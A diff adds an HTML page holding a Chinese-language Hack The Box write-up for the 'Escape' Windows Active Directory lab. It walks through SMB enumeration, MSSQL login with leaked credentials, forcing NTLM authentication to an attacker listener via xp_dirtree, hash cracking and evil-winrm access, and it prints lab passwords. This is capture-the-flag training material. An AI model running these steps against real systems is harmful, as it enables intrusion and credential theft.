@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="http://xvuln.com/HTB/HTB-Escape/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Escape - My Docs</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Escape";
+        var mkdocs_page_input_path = "HTB/HTB-Escape.md";
+        var mkdocs_page_url = "/HTB/HTB-Escape/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> My Docs
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">WEB 测试指南</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../WEB%20Guide/%E6%A6%82%E8%BF%B0/">概述</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../WEB%20Guide/2%E3%80%81%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/">配置部署管理测试</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">HTB</span></p>
+              <ul class="current">
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Escape</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#_1">概要</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#smb">SMB 信息泄露</a>
+    </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">DOC</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../DOC/mkdocs/">Mkdocs 文档</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Read</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="" href="../../Read/三联生活周刊.md">三联生活周刊</a>
+                  </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="" href="https://book.hacktricks.xyz/">Hacktricks</a>
+                </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">My Docs</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a> &raquo;</li>
+          <li>HTB &raquo;</li>
+      <li class="breadcrumb-item active">Escape</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="htb-escape">HTB-Escape</h1>
+<h2 id="_1">概要</h2>
+<p><code>Escap</code> 是一个中等难度的 <code>Windwos Active Directory</code> 机器，以 <code>SMB</code> 共享启动，经过身份验证的来宾用户可以下载敏感的 <code>PDF 文件</code>。PDF 文件内的临时凭据可用于访问计算机运行的 <code>MSSQL</code> 服务。攻击者能够控制 <code>MSSQL</code> 服务对其计算机进行身份验证并捕获 <code>HASH</code>。事实证明，该服务正在用户账户下运行，并且 HASH 是可破解的。拥有一组有效的凭据后，攻击者能够使用 <code>WinRM</code> 在计算机上执行系统命令。枚举计算机时，日志文件会显示用于进一步枚举计算机的凭据，显示存在证书颁发机构和用户 <code>ryan.cooper</code>。使用 <code>Certify</code> 工具可以检测到一个证书模板容易受到 <code>ESC1</code> 攻击，这意味着能够使用此模板的用户可以对域中任何用户请求证书。因此，利用 ESC1 漏洞，攻击者能够获取管理员账户的有效证书，然后使用它来获取管理员用户的 HASH。</p>
+<h2 id="smb">SMB 信息泄露</h2>
+<p>枚举主机 smb 信息</p>
+<pre><code class="language-shell">smbclient -L \\\\ sequel.htb\\
+</code></pre>
+<p>登录 public 账户</p>
+<pre><code class="language-shell">smbclient \\\\sequel\\public
+</code></pre>
+<p>在 PDF 文件里找到用户账户信息</p>
+<pre><code class="language-shell">smb: \&gt; ls
+SQL Server Procedures.pdf
+</code></pre>
+<p>使用 impacket MsSQL客户端连接</p>
+<pre><code class="language-shell">impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequal.htb
+</code></pre>
+<p>在机器上监听网卡</p>
+<pre><code class="language-shell">responder -I tun0 -v
+</code></pre>
+<p>在 MsSQL 上强制执行某某·</p>
+<pre><code class="language-shell">EXEC MASTER.sys.xp_dirtree '\\10.10.14.4\test', 1, 1
+</code></pre>
+<p>监听到了会连的 Hash，使用 John 破解。</p>
+<pre><code class="language-shell">john --wordlist=/../rockyou.txt hash
+</code></pre>
+<p>得到系统账户密码 sql_srv:REGGIE1234ronnie</p>
+<p>ls C:\users</p>
+<p>使用 evil-winrm 连接 Windows 命令行</p>
+<pre><code class="language-shell">evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
+</code></pre>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../../WEB%20Guide/2%E3%80%81%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/" class="btn btn-neutral float-left" title="配置部署管理测试"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../../DOC/mkdocs/" class="btn btn-neutral float-right" title="Mkdocs 文档">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../../WEB%20Guide/2%E3%80%81%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../../DOC/mkdocs/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
